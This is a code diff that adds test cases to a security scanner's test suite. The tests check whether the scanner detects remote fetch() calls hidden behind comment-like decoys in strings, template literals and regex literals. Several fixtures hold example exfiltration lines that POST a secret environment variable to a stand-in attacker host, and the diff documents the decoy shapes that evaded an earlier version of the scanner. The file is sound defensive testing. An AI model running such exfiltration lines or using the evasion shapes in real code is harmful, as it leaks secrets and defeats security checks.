@@ -273,4 +273,95 @@ describe('apply-safety-scan: stripNonFetchText (#1715)', () => {
     });
     expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
   });
+
+  // ---- #1715 round 2: a string-literal decoy bypassed round-1's stripper --
+
+  const expectFlagged = (src: string) => {
+    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
+      resolveSource: () => src,
+      followScripts: true,
+    });
+    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
+  };
+  const expectClean = (src: string) => {
+    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
+      resolveSource: () => src,
+      followScripts: true,
+    });
+    expect(offenders).toEqual([]);
+  };
+
+  it('RED: the exact round-2 decoy repro — "/* " then a real fetch() then "*/" as three statements', () => {
+    const decoy = [
+      `const decoy = "/* ";`,
+      `fetch("http://attacker.example.com/exfil?data=" + process.env.SECRET, {method:"POST"});`,
+      `const end = "*/";`,
+      ``,
+    ].join('\n');
+    expectFlagged(decoy);
+  });
+
+  it('RED: the SAME decoy shape with a template literal instead of a double-quoted string', () => {
+    const decoy = [
+      'const decoy = `/* `;',
+      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
+      'const end = `*/`;',
+      ``,
+    ].join('\n');
+    expectFlagged(decoy);
+  });
+
+  it('RED: the SAME decoy shape with single-quoted strings', () => {
+    const decoy = [
+      "const decoy = '/* ';",
+      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
+      "const end = '*/';",
+      ``,
+    ].join('\n');
+    expectFlagged(decoy);
+  });
+
+  it('RED: a regex literal containing `/*` or `//` does not open a comment either', () => {
+    const decoy = [
+      'const re1 = /\\/\\*/;',
+      'const re2 = /\\/\\//;',
+      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
+      ``,
+    ].join('\n');
+    expectFlagged(decoy);
+  });
+
+  it('RED: fetch("https://x") where the ONLY `//` in the file is inside the URL string', () => {
+    expectFlagged(`fetch("https://attacker.example.com/x");\n`);
+  });
+
+  it('GREEN control: a real fetch() call that genuinely IS inside a block comment is not flagged', () => {
+    const src = [
+      `/*`,
+      ` * disabled for now: fetch("http://attacker.example.com/exfil");`,
+      ` */`,
+      `import http from 'node:http';`,
+      `http.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});`,
+      ``,
+    ].join('\n');
+    expectClean(src);
+  });
+
+  it('RED: a fetch() call inside a template-literal `${…}` expression is flagged (code, not string data)', () => {
+    const src = 'const x = `${fetch("http://attacker.example.com/exfil")}`;\n';
+    expectFlagged(src);
+  });
+
+  it('RED: a real fetch() nested as an argument INSIDE new URL(…) is not swallowed with it', () => {
+    const src = 'const u = new URL(fetch("http://attacker.example.com/exfil"), "http://x");\n';
+    expectFlagged(src);
+  });
+
+  it('RED: an unterminated template literal fails closed even with no visible fetch shape', () => {
+    // #1715 round 2, guarantee (2): the tokenizer itself could not fully
+    // parse this file (the backtick never closes) — flag regardless of
+    // whether INTERPRETER_FETCH matches anything.
+    const src = 'import http from "node:http";\nconst s = `unterminated\n';
+    expectFlagged(src);
+  });
 });
